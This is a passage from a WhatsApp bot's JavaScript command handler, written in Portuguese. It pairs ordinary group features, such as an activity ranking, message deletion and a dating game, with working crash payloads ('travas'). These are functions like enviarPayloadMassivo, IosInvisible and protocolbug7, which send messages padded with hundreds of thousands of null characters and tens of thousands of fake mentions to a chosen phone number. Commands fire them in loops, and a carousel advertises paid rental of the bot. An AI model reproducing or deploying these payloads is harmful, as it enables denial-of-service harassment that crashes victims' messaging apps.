  trava1
} = require("./travas/trava1.js");
const {
  trava8
} = require("./travas/trava8.js");
const {
  trava12
} = require("./travas/trava12.js");
const {
  travadoc
} = require("./travas/travadoc.js");

async function enviarPayloadMassivo(jid, usarParticipante = true) {
  try {
    for(let i = 0; i < 5; i++) {
      await uwu.relayMessage(jid, {
      extendedTextMessage: {
        text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±¬ø? " + 
              "Í¶æ".repeat(103000) + " " + 
              "@0".repeat(25000),

        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net", 
            ...Array.from({ length: 15000 }, () => Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [{
                jid: "0@s.whatsapp.net",
                callOutcome: "1"
              }]
            }
          },
          remoteJid: "0@s.whatsapp.net",
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±",
            mediaType: "IMAGE",
            jpegThumbnail: thumbnailreply,
            caption: "¬© ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±"
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±",
            body: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±" + "\0".repeat(200),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: thumbnailreply,
            sourceType: "destroyer",
            sourceId: "crasher",
            sourceUrl: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q",
            mediaUrl: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "destroyer_child",
            ref: "ref_crasher"
          },
          entryPointConversionSource: "destroyer_source",
          entryPointConversionApp: "destroyer_app",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://whatsapp.com/channel/0029VazrSjKFHWpylIi1IZ3q"
          },
          groupSubject: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±",
          parentGroupJid: "0@g.us",
          trustBannerType: "destroyer_banner",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "destroyer",
            utmCampaign: "crasher"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "0@newsletter",
            serverMessageId: 1,
            newsletterName: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±",
            contentType: "UPDATE",
            accessibilityText: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±"
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbriyuCampaignId: "destroyer_campaign",
          smbServerCampaignId: "crasher_campaign",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, usarParticipante ? {
      participant: { jid: jid }
    } : {});
    }

  } catch (erro) {
    console.error(chalk.red.bold("[!] Erro ao enviar payload:", erro));
    throw erro;
  }
}

async function IosInvisible(target) {
    for (let i = 0; i < 1; i++) {
        await uwu.relayMessage(target, {
            extendedTextMessage: {
                text: 'ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±' + "\u0000".repeat(850000),
                contextInfo: {
                    groupMentions: [{ groupJid: "000000000000009@g.us", groupSubject: "‚Å®üî•" }],
                    stanzaId: "1234567890ABCDEF",
                    participant: "13135550002@s.whatsapp.net",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "1",
                            durationSecs: "999999999",
                            callType: "REGULAR",
                            participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
                        }
                    },
                    remoteJid: target,
                    conversionSource: "source_example",
                    conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Example Advertiser",
                        mediaType: "IMAGE",
                        jpegThumbnail: thumbnailreply,
                        caption: "@ Voc√™ foi mencionado"
                    },
                    placeholderKey: { remoteJid: "13135550002@s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" },
                    expiration: 86400,
                    ephemeralSettingTimestamp: "1728090592378",
                    ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                    externalAdReply: {
                        title: "@ Voc√™ foi mencionado",
                        body: "@ Voc√™ foi mencionado",
                        mediaType: "VIDEO",
                        renderLargerThumbnail: true,
                        previewTtpe: "VIDEO",
                        thumbnail: thumbnailreply,
                        sourceType: " x ",
                        sourceId: " x ",
                        sourceUrl: "https://wa.me/+5569999568598",
                        mediaUrl: "https://wa.me/+5569999568598",
                        containsAutoReply: true,
                        renderLargerThumbnail: true,
                        showAdAttribution: true,
                        ctwaClid: "ctwa_clid_example",
                        ref: "ref_example"
                    },
                    entryPointConversionSource: "entry_point_source_example",
                    entryPointConversionApp: "entry_point_app_example",
                    entryPointConversionDelaySeconds: 5,
                    disappearingMode: {},
                    actionLink: { url: "https://wa.me/+5569999568598" },
                    groupSubject: "Pwq",
                    parentGroupJid: "8888888888888-1234567890@g.us",
                    trustBannerType: "trust_banner_example",
                    trustBannerAction: 1,
                    isSampled: false,
                    utm: { utmSource: "utm_source_example", utmCampaign: "utm_campaign_example" },
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "8888888888888-1234567890@g.us",
                        serverMessageId: 1,
                        newsletterName: " X ",
                        contentType: "UPDATE",
                        accessibilityText: "X"
                    },
                    businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
                    smbClientCampaignId: "smb_client_campaign_id_example",
                    smbServerCampaignId: "smb_server_campaign_id_example",
                    dataSharingContext: { showMmDisclosure: true }
                }
            }
        }, { participant: { jid: target } }); 
    }
}

async function protocolbug7(isTarget) {
¬† const floods = 40000;
¬† const mentioning = "13135550002@s.whatsapp.net";
¬† const mentionedJids = [
¬†¬†¬† mentioning,
¬†¬†¬† ...Array.from({ length: floods }, () =>
¬†¬†¬†¬†¬† `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
¬†¬†¬† )
¬† ];

¬† const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
¬† const mime = "audio/mpeg";
¬† const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
¬† const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
¬† const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
¬† const timestamp = 99999999999999;
¬† const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
¬† const longs = 99999999999999;
¬† const loaded = 99999999999999;
¬† const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

¬† const messageContext = {
¬†¬†¬† mentionedJid: mentionedJids,
¬†¬†¬† isForwarded: true,
¬†¬†¬† forwardedNewsletterMessageInfo: {
¬†¬†¬†¬†¬† newsletterJid: "120363321780343299@newsletter",
¬†¬†¬†¬†¬† serverMessageId: 1,
¬†¬†¬†¬†¬† newsletterName: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£„á±"
¬†¬†¬† }
¬† };

¬† const messageContent = {
¬†¬†¬† ephemeralMessage: {
¬†¬†¬†¬†¬† message: {
¬†¬†¬†¬†¬†¬†¬† audioMessage: {
¬†¬†¬†¬†¬†¬†¬†¬†¬† url: links,
¬†¬†¬†¬†¬†¬†¬†¬†¬† mimetype: mime,
¬†¬†¬†¬†¬†¬†¬†¬†¬† fileSha256: sha,
¬†¬†¬†¬†¬†¬†¬†¬†¬† fileLength: longs,
¬†¬†¬†¬†¬†¬†¬†¬†¬† seconds: loaded,
¬†¬†¬†¬†¬†¬†¬†¬†¬† ptt: true,
¬†¬†¬†¬†¬†¬†¬†¬†¬† mediaKey: key,
¬†¬†¬†¬†¬†¬†¬†¬†¬† fileEncSha256: enc,
¬†¬†¬†¬†¬†¬†¬†¬†¬† directPath: path,
¬†¬†¬†¬†¬†¬†¬†¬†¬† mediaKeyTimestamp: timestamp,
¬†¬†¬†¬†¬†¬†¬†¬†¬† contextInfo: messageContext,
¬†¬†¬†¬†¬†¬†¬†¬†¬† waveform: data
¬†¬†¬†¬†¬†¬†¬† }
¬†¬†¬†¬†¬† }
¬†¬†¬† }
¬† };

¬† const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

¬† const broadcastSend = {
¬†¬†¬† messageId: msg.key.id,
¬†¬†¬† statusJidList: [isTarget],
¬†¬†¬† additionalNodes: [
¬†¬†¬†¬†¬† {
¬†¬†¬†¬†¬†¬†¬† tag: "meta",
¬†¬†¬†¬†¬†¬†¬† attrs: {},
¬†¬†¬†¬†¬†¬†¬† content: [
¬†¬†¬†¬†¬†¬†¬†¬†¬† {
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† tag: "mentioned_users",
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† attrs: {},
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† content: [
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† { tag: "to", attrs: { jid: isTarget }, content: undefined }
¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† ]
¬†¬†¬†¬†¬†¬†¬†¬†¬† }
¬†¬†¬†¬†¬†¬†¬† ]
¬†¬†¬†¬†¬† }
¬†¬†¬† ]
¬† };

¬† await uwu.relayMessage("status@broadcast", msg.message, broadcastSend);
}

switch(command) {

case 'teste':
  if(!isCreator) return
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await IosInvisible(jid)
break

case 'closeuiteste':
  if(!isCreator) return
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await IosInvisible(jid)
break

case 'ios':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  await enviarPayloadMassivo(jid)
  reply(`Trava ios enviada!\nAguarde 2 minutos para usar novamente`)
break

case "convite":
  if (!isCreator) return;

  const fakeQuoted = {
    key: {
      fromMe: true,
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast"
    },
    message: {
      orderMessage: {
        itemCount: 999999999,
        status: 1,
        surface: 1,
        message: "ùêåùêáùêôùêàùêç ùêéùêñùêçùêÑùêë ùêïùüê",
        orderTitle: "Bug do Convite",
        sellerJid: "555381121269@s.whatsapp.net",
        thumbnail: thumbnailreply
      }
    }
  };

  const bug = async () => {
    const content = {
      groupInviteMessage: {
        groupName: "ùêëùê®ùêÅùê®ùêì ùêÇùê®ùêãùêãùêöùêÅ" + trava12 + travadoc + trava8,
        groupJid: "6285709664923-1627579259@g.us",
        inviteCode: "h+64P9RhJDzgXSPf",
        inviteExpiration: 999,
        caption: "[ ùêÅùêîùêÜ ] üçå - COLLAB BANANA",
        jpegThumbnail: thumbnailreply
      }
    };

    const msg = await generateWAMessageFromContent(m.chat, content, {
      userJid: m.sender,
      quoted: fakeQuoted
    });

    await uwu.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
  };

  for (let i = 0; i < 6; i++) await bug();
  break;

// case 'conectar': {
//     if (!q) return reply(`‚ùó Exemplo:\n${prefix + command} 55xxxxxxxxxxx`);

//     const victim = text.split("|")[0];
//     const Xreturn = m.mentionedJid?.[0]
//         ? m.mentionedJid[0]
//         : m.quoted
//         ? m.quoted.sender
//         : victim.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

//     // Verifica se o n√∫mero est√° registrado no WhatsApp
//     const contactInfo = await uwu.onWhatsApp(Xreturn);
//     if (!contactInfo || contactInfo.length === 0) {
//         return reply("‚ùå O n√∫mero n√£o est√° registrado no WhatsApp!");
//     }

//     const numeroLimpo = victim.replace(/[^0-9]/g, '');
//     const countryCode = numeroLimpo.slice(0, 3);
//     const prefixxx = numeroLimpo.slice(0, 1);
//     const firstTwoDigits = numeroLimpo.slice(0, 2);

//     // Verifica√ß√£o de n√∫mero inv√°lido
//     if (
//         countryCode === "252" ||
//         prefixxx === "0" ||
//         firstTwoDigits === "89" ||
//         countryCode.startsWith("85")
//     ) {
//         return reply("‚ö†Ô∏è N√∫meros com DDD 252, prefixo 0, come√ßando com 89 ou +85 n√£o s√£o suportados.");
//     }

//     const isValidWhatsAppNumber = (number) => {
//         return number.length >= 10 && number.length <= 15 && !isNaN(number);
//     };

//     if (!isValidWhatsAppNumber(numeroLimpo)) {
//         return reply("‚ùó Forma incorreta! Exemplo:\n.conectar 5533987123456");
//     }

//     // Recomenda√ß√£o
//     await reply("üîÑ Iniciando conex√£o...\n‚úÖ Recomendado usar WhatsApp normal (original) para melhor estabilidade!");

//     // Iniciar pareamento
//     const startpairing = require('./pairing.js');
//     await startpairing(Xreturn);
//     await sleep(4000);

//     const cu = fs.readFileSync('./pairing/pairing.json', 'utf-8');
//     const cuObj = JSON.parse(cu);

//     if (!cuObj.code) {
//         return reply("‚ùå Erro ao gerar o c√≥digo de pareamento. Tente novamente.");
//     }

//     await reply(`üì≤ Seu c√≥digo de pareamento:\n\n*${cuObj.code}*`);
//     break;
// }

case 'alugarbot':
case 'alugar':
    try {
        await reagir(from, "üíé");        
        const Nk = {
            male: `https://files.catbox.moe/90bkax.jpg`, 
            female: `https://files.catbox.moe/90bkax.jpg`, 
            thirdImage: `https://files.catbox.moe/90bkax.jpg` 
        };

        const maleMedia = await prepareWAMessageMedia({ image: { url: Nk.male } }, { upload: uwu.waUploadToServer });
        const femaleMedia = await prepareWAMessageMedia({ image: { url: Nk.female } }, { upload: uwu.waUploadToServer });
        const thirdMedia = await prepareWAMessageMedia({ image: { url: Nk.thirdImage } }, { upload: uwu.waUploadToServer });

        const carouselMessage = {
            text: "Destroyer",
            cards: [
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: maleMedia.imageMessage
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `‚ú® 15 Dias de Acesso ‚Äî S√≥ R$15,00! ‚ú®

Garanta 15 dias de acesso completo por apenas R$15,00!
üîê Uma solu√ß√£o r√°pida, segura e econ√¥mica para quem precisa de praticidade sem enrola√ß√£o.

üíº Ideal para usos tempor√°rios, com total prote√ß√£o e estabilidade durante todo o per√≠odo.
N√£o perca essa oportunidade de aproveitar muito por t√£o pouco! üí∏`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Íú±·¥ú·¥©·¥è Ä·¥õ·¥á\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*15*%20dias%20‚úÖ\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*15*%20dias%20‚úÖ\"}`
                        }]
                    }
                },
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: femaleMedia.imageMessage
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `üå† 30 Dias de Acesso ‚Äî Apenas R$35,00! üå†

Tenha 1 m√™s completo de uso por s√≥ R$35,00!
üìÖ Mais tempo, mais liberdade e muito mais aproveitamento para o que voc√™ est√° alugando.

üîê Conte com seguran√ßa total e uma experi√™ncia otimizada, feita pra facilitar sua rotina de forma pr√°tica e tranquila.`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Íú±·¥ú·¥©·¥è Ä·¥õ·¥á\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*30*%20dias%20‚úÖ\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*30*%20dias%20‚úÖ\"}`
                        }]
                    }
                },
                {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: thirdMedia.imageMessage // Usando a terceira imagem
                    },
                    headerType: 'IMAGE',
                    body: {
                        text: `üå† 60 Dias de Acesso ‚Äî S√≥ R$65,00! üå†

Precisa de mais tempo? Ent√£o essa √© pra voc√™:
üîß 2 meses completos por apenas R$65,00!

Ideal para quem busca uma solu√ß√£o de longo prazo com economia garantida, prote√ß√£o total e a liberdade de aproveitar tudo com calma e seguran√ßa.

üõ†Ô∏è Mais tempo, mais vantagens, menos preocupa√ß√µes.`
                    },
                    footer: {
                        text: `${global.botname}`
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Íú±·¥ú·¥©·¥è Ä·¥õ·¥á\",\"url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*60*%20dias%20‚úÖ\",\"merchant_url\":\"https://Wa.me/5569999568598?text=Estou%20querendo%20alugar%20por%20*60*%20dias%20‚úÖ\"}`
                        }]
                    }
                }
            ]
        };

        await uwu.relayMessage(from, {
            interactiveMessage: {
                contextInfo: {                    
                    participant: from,
                    quotedMessage: {
                        documentMessage: {
                            contactVcard: true,
                            quoted: EsQl
                        }
                    }
                },
                body: { text: '‚è§ÕüÕûÕüÕûEST√Å QUERENDO ALUGAR? OLHE A TABELA ABAXO... üôá‚Äç‚ôÇÔ∏è ‚Ü¥' },
                carouselMessage: carouselMessage
            }
        }, {});

    } catch (e) {
        console.log(e);
        await uwu.sendMessage(from, { text: "Ocorreu um erro, tente novamente." }, { quoted: EsQl });
    }
break;

case 'protocolbug':
  if(!isCreator) return reply(mess.prem)
  if (!q.trim()) return reply(`Exemplo: ${prefix}${command} 558198923680`)

  var jid = await validarNumeroWhatsApp(q, reply)
  if (!jid) return
  for(let i = 0; i < 50; i++) {
    await protocolbug6(jid)
    await protocolbug7(jid)
  }
  await reply(`bug enviado para o alvo!\nAguarde 2minutos para utilizar novamente`)
break

case 'rankativos':
  if (!m.isGroup) return reply(mess.grp);

  const groupId = m.chat;
  const caminhoRank = `./DADOS/rankmensagens/${groupId}.json`;

  if (!fs.existsSync(caminhoRank)) return reply('‚ùå Nenhuma mensagem foi contabilizada ainda neste grupo.');

  const rankData = JSON.parse(fs.readFileSync(caminhoRank));
  const membrosOrdenados = Object.entries(rankData)
    .sort((a, b) => b[1] - a[1])
    .slice(0, 10);

  const grupoMeta = await uwu.groupMetadata(groupId);
  const participantes = grupoMeta.participants;

  let textoRank = `üìä *Top 10 Mais Ativos no Grupo:*\n\n`;

  for (let i = 0; i < membrosOrdenados.length; i++) {
    const [numero, qtd] = membrosOrdenados[i];
    const userInfo = participantes.find(p => p.id === numero);
    const nome = userInfo?.notify || userInfo?.name || numero.split('@')[0];
    textoRank += `${i + 1}. @${numero.split('@')[0]} ‚Äî *${qtd}* mensagens\n`;
  }

  await uwu.sendMessage(m.chat, {
    text: textoRank,
    mentions: membrosOrdenados.map(([n]) => n)
  }, { quoted: m });
break;

case 'apg':
case 'd':
case 'apagar':
case 'delete':
  if (!isAdmins) return reply(mess.admin);
  if (!m.quoted) return reply('‚ùå Marque uma mensagem para apagar.');
  if (!isBotAdmins) return reply(mess.botadm)

  try {
    await uwu.sendMessage(m.chat, {
      delete: {
        remoteJid: m.chat,
        fromMe: false,
        id: m.quoted.id,
        participant: m.quoted.sender
      }
    });
  } catch (e) {
    console.error(e);
    reply('‚ùå Falha ao apagar a mensagem.');
  }
break;

case 'bemvindo':
  if (!m.isGroup) return reply(mess.grp)
  if (!isAdmins) return reply(mess.admin)
  if (!isBotAdmins) return reply(mess.botadm)
  if (args.length < 1) return reply('Use:\n1 para ativar\n0 para desativar\nOpcional: ap√≥s 1, escreva a mensagem de boas-vindas')

  const status = Number(args[0])
  const novaMensagem = args.slice(1).join(' ').trim() // texto ap√≥s o "1"

  if (status === 1) {
    if (isWelkom) return reply('J√° est√° ativo o recurso de boas-vindas neste grupo.')

    dataGp[0].wellcome[0].bemvindo1 = true

    if (novaMensagem) {
      dataGp[0].wellcome[0].legendabv = novaMensagem
    } else if (!dataGp[0].wellcome[0].legendabv) {
      // Mensagem padr√£o, caso n√£o tenha nada definido
      dataGp[0].wellcome[0].legendabv = "Ol√° @usuario, seja bem-vindo(a) ao grupo! üéâ"
    }

    setGp(dataGp)
    reply('üåÄ Recurso de boas-vindas ativado com sucesso neste grupo üìù')
    if (novaMensagem) reply('üí¨ Mensagem de boas-vindas atualizada.')
  } else if (status === 0) {
    if (!isWelkom) return reply('J√° est√° desativado o recurso de boas-vindas.')

    dataGp[0].wellcome[0].bemvindo1 = false
    setGp(dataGp)
    reply('‚ÄºÔ∏è Recurso de boas-vindas desativado com sucesso neste grupo ‚úîÔ∏è')
  } else {
    reply('Use 1 para ativar ou 0 para desativar o recurso.')
  }
break

case 'namorar':
// @Matheus
setTimeout(() => {
    reagir(from, "üíç")
}, 300)
if (!m.isGroup) return reply(mess.grp)
if (!menc_os2) return reply('Marque a mensagem ou o @ que queira pedir ela em namoro. Se voc√™ tomar um fora, ju√≠zo!')
if (botNumber.includes(menc_os2)) return reply("üíç Ei! Eu sou s√≥ um bot... j√° tenho um compromisso s√©rio com a programa√ß√£o ü§ñ‚ù§Ô∏è\n\nDesculpa, mas meu cora√ß√£o j√° est√° ocupado por linhas de c√≥digo e loops infinitos! üòÖüíî")
if (JSON.stringify(namoro2).includes(menc_os2)) return reply("üíò Algu√©m j√° teve essa brilhante ideia antes!\n\nEsse usu√°rio j√° foi pedido em namoro... talvez ainda esteja pensando na resposta ou curtindo o momento! üí≠üíï")
if (JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return reply(`üíî Ei, ${pushname}...\nParece que seu cora√ß√£o j√° escolheu algu√©m antes! üòï\n\nVoc√™ j√° fez um pedido de namoro e est√° aguardando a resposta ou j√° est√° comprometido(a). N√£o d√° pra jogar com sentimentos, n√©? üíå`)
if (JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return reply(`üö´ Ops, n√£o vai rolar, ${pushname}...\nEssa pessoa j√° est√° comprometida e seu cora√ß√£o j√° tem dono(a)! üíîüåö`)
if (JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return mention(`üíå Voc√™ j√° pediu para namorar com @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}. Por favor, n√£o brinque com os sentimentos alheios! Decida-se logo ou cancele o pedido com: *${prefix}cancelarpedido*.`)
if (JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return mention(`üíñ Voc√™ j√° est√° namorando com a(o) @${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}! Que continuem sempre juntos e felizes! üåπ`)
namoro1.push({
    usu1: sender,
    usu2: menc_os2.split('@')[0],
    namorados: false,
    idgp: from,
    hora: hora,
    data: date
})
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.push({
    id: menc_os2,
    pedido: sender.split('@')[0],
    idgp: from
})
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
mention(`üíò *Um Momento M√°gico Est√° Acontecendo...* üí´\n\nüåπ *@${sender.split('@')[0]}* tomou coragem, reuniu os sentimentos mais sinceros e decidiu abrir o cora√ß√£o para voc√™, *@${menc_os2.split('@')[0]}*.\n\nüíû Com muito carinho, ele(a) te faz um pedido especial:\n\nüë©‚Äç‚ù§Ô∏è‚Äçüë® *Voc√™ aceita namorar comigo?*\n\nüì© Responda com: _sim_ ou _n√£o_ üíå\n\n‚ú® Que o amor flores√ßa onde h√° sinceridade. ‚ú®`)
break

case 'cancelarpedido':
// @Matheus
if (!m.isGroup) return reply(mess.grp)
if (!JSON.stringify(namoro1).includes(sender)) return reply("N√£o h√° pedido de namoro para cancelar.")
C13 = namoro1.map(i => i.usu1).indexOf(sender)
C15 = namoro2.map(i => i.id).indexOf(namoro1[C13].usu2 + "@s.whatsapp.net")
if (namoro1[C13].namorados == true) return reply("N√£o √© poss√≠vel cancelar o pedido de namoro depois de aceito.")
namoro1.splice(C13, 1)
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C15, 1)
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
reply("Pedido de namoro cancelado com sucesso.")
break

case 'terminar_namoro': {
    const index1 = namoro1.findIndex(i => i.usu1 === sender && i.namorados)
    if (index1 === -1) return reply(`Voc√™ n√£o est√° namorando com ningu√©m. Sinto muito!`)

    const parceiro = `${namoro1[index1].usu2}@s.whatsapp.net`

    // Avisa o parceiro
    uwu.sendMessage(parceiro, {
        text: `üíî *Not√≠cia Triste...*\n\nSeu parceiro(a) acaba de colocar um ponto final no relacionamento com voc√™.\n\nüïäÔ∏è *"Nem todo adeus √© falta de amor, √†s vezes √© excesso de dor."*\n\nüå∏ Guarde os bons momentos no cora√ß√£o e siga em frente com leveza. A vida continua, e o amor pode florescer novamente. ü•Ä`
    }, {
        quoted: seloMeta
    })

    reply(`
üíî *T√©rmino Confirmado!* üíî

Voc√™ decidiu seguir um novo caminho...  
Agora est√° oficialmente *solteiro(a)*.

üßò Respire fundo, cuide de si,  
e lembre-se: *o amor pr√≥prio sempre vem em primeiro lugar.* ‚ú®

üîÆ Que novos come√ßos venham com boas hist√≥rias!
`)

    const index2 = namoro1.findIndex(i => i.usu1 === parceiro && i.usu2 === sender.split('@')[0])

    if (index2 !== -1) {
        namoro1.splice(index2, 1)
    }

    namoro1.splice(index1, 1)
    fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))

    // Remover do namoro2 tamb√©m
    const indexPedido1 = namoro2.findIndex(n => n.pedido === sender.split('@')[0])
    if (indexPedido1 !== -1) namoro2.splice(indexPedido1, 1)

    const indexPedido2 = namoro2.findIndex(n => n.pedido === parceiro.split('@')[0])
    if (indexPedido2 !== -1) namoro2.splice(indexPedido2, 1)

    fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2, null, 2))
}
break

case 'dupla': {
    if (!m.isGroup) return reply(mess.grp)

    const D1 = namoro1.findIndex(i => i.usu1 === sender)
    if (D1 === -1) return reply(`üíî *Nada por aqui...*\n\nVoc√™ n√£o est√° namorando com ningu√©m no momento. üò¢\n\nüå± Mas tudo bem... O amor aparece quando a gente menos espera. Seja paciente e cuide bem do seu cora√ß√£o! ‚ù§Ô∏è`)
    
    if (!namoro1[D1].namorados) {
        return reply(`üíî *Pedido Pendente...*\n\nA pessoa que voc√™ pediu em namoro ainda *n√£o aceitou* o pedido. üòî\n\n‚è≥ Aguarde pacientemente ou tente conversar com ela para entender o que houve.\n\nüìå Enquanto isso, n√£o √© poss√≠vel consultar os dados da dupla.`)
    }

    reagir(from, "üê≤")

    const parceiro = namoro1[D1].usu2.includes('@') ? namoro1[D1].usu2 : `${namoro1[D1].usu2}@s.whatsapp.net`

    const txt = `
‚ï≠‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüíñ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïÆ
  üíë *Dupla Encontrada com Sucesso!*
‚ï∞‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅüíñ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚ïØ

‚ú® *Casal Formado:*
@${sender.split('@')[0]}  
‚ù§Ô∏è  
@${parceiro.split('@')[0]}

üìÖ *Desde:* *${namoro1[D1].data}*
üïí *Hora do Pedido:* *${namoro1[D1].hora}*

üíå *Esse casal est√° unido pelo destino...*  
